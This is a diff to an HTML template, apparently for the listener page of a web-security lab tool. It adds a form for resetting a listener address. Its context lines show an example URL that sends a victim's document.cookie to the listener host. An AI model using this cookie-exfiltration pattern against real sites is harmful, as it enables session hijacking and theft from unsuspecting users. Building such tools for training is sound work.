@@ -13,6 +13,13 @@
   <p class="muted">Same address works from the victim's browser and from your own machine
   (<code>curl</code>/<code>ncat</code> reference). Tack the stolen data onto the URL, e.g.
   <code>https://listener.{{ domain }}/l/{{ lid }}/?c=${encodeURIComponent(document.cookie)}</code>.</p>
+  {% if is_mine %}
+  <form method="post" action="{{ url_for('listener_reset') }}" class="reset-form"
+        onsubmit="return confirm('Reset your listener address? Payloads pointed at the old address will stop landing here.');">
+    <button type="submit" class="btn-reset">Reset address</button>
+    <span class="muted">— generates a fresh link; the old one goes dead.</span>
+  </form>
+  {% endif %}
 </div>
 
 {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
